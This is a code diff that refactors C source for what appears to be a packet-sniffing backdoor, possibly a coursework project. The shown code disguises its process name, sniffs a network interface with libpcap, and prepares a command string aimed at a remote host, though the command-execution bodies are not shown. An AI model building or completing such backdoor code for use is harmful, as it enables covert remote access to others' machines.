@@ -3,29 +3,38 @@
 static sigjmp_buf jmpbuf;
 static volatile sig_atomic_t canjump;
 pthread_mutex_t ThreadLock = PTHREAD_MUTEX_INITIALIZER;
-int running = 1;
+//int running = 1;
+
+static void endProgram (int signo);
+static void unlock (int signo);
+
 
 int main(int argc, char** argv)
 {
+    running = 1;
     AddrInfo *Addr_Ptr;
     PcapInfo *pcap_ptr;
-    int opt;
-    pthread_t ThreadID, ThreadID2;
+    //int opt;
+    pthread_t ThreadID2;//, ThreadID;
 
     disguise(argv);
-    checkArgs(argc, argv);
+    //checkArgs(argc, argv);
+    //setConfig();
+    
+    initializeAddress(&Addr_Ptr);
     initializeDoor(Addr_Ptr);
-    setConfig();
-    initializePcap(pcap_ptr, Addr_Ptr);
+    initializePcap(&pcap_ptr, Addr_Ptr);
+    setPcap(pcap_ptr, Addr_Ptr);
     initializeSocket(Addr_Ptr);
     setupSignals();
 
     //authenticateClient();
     pthread_create (&ThreadID2, NULL, ReceiveDatagram, (void *)pcap_ptr);
     pthread_join (ThreadID2, NULL);
+    //ReceiveDatagram(pcap_ptr);
 
-    free (Addr_Ptr);
-    free (pcap_ptr);
+    //free (Addr_Ptr);
+    //free (pcap_ptr);
     return 0;
 }
 
@@ -39,19 +48,31 @@ void initializeSocket(AddrInfo *Addr_Ptr)
         perror("setsockopt");
 }
 
-void initializePcap(PcapInfo *pcap_ptr, AddrInfo *Addr_Ptr)
+void initializeAddress(AddrInfo **Addr_Ptr)
 {
-    char *nic_dev; 
-    char errbuf[PCAP_ERRBUF_SIZE];
-    bpf_u_int32 maskp;          // subnet mask    
-
-
-    if ((pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
+    if ((*Addr_Ptr = malloc (sizeof (AddrInfo))) == NULL)
     {
         perror ("malloc");
         exit (1);
     }
-    nic_dev = "p2p1"; // CHANGE
+}
+
+void initializePcap(PcapInfo **pcap_ptr, AddrInfo *Addr_Ptr)
+{
+    if ((*pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
+    {
+        perror ("malloc");
+        exit (1);
+    }
+}
+
+
+void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr)
+{
+    char *nic_dev = "p2p1"; // CHANGE; 
+    char errbuf[PCAP_ERRBUF_SIZE];
+    bpf_u_int32 maskp;          // subnet mask    
+
     pcap_lookupnet (nic_dev, &pcap_ptr->netp, &maskp, errbuf);
     pcap_ptr->nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
     
@@ -62,6 +83,7 @@ void initializePcap(PcapInfo *pcap_ptr, AddrInfo *Addr_Ptr)
     }
 
     snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD, Addr_Ptr->DstHost, Addr_Ptr->dport);
+    printf("%s\n", pcap_ptr->cmd);
 }
 
 void initializeDoor(AddrInfo *Addr_Ptr)
@@ -71,7 +93,7 @@ void initializeDoor(AddrInfo *Addr_Ptr)
     srand(iseed);
 
     // set defaults
-    Addr_Ptr->SrcHost = GetIPAddress ();    // Default Source IP
+    Addr_Ptr->SrcHost = GetIPAddress();    // Default Source IP
     Addr_Ptr->DstHost = NULL;           // Must be specified by user!
     Addr_Ptr->dport = DEFAULT_DST_PORT;     // Default Destination Port
     Addr_Ptr->sport = rand()% 40000 + 2000; // Default (Random) Source Port between 2000 and 60000
@@ -115,7 +137,7 @@ void authenticateClient()
 static void endProgram (int signo)
 {
     // stop the program
-    running = 1;
+    running = 0;
 }
 
 static void unlock (int signo)
@@ -131,6 +153,7 @@ void* knockListener(void* pcap_arg)
 {
     // NOT YET IMPLEMENTED
     //
+    return NULL;
 }
 
 void executeCommand()
@@ -145,13 +168,13 @@ void spawnThread()
 
 void setConfig()
 {
-    char* options = "";
-    options = readConfigFile();
+ //   char* options = "";
+   // options = readConfigFile();
 }
 
 char* readConfigFile()
 {
-    char* options = "";
+    char* options = "lol";
 
     return options;
 }
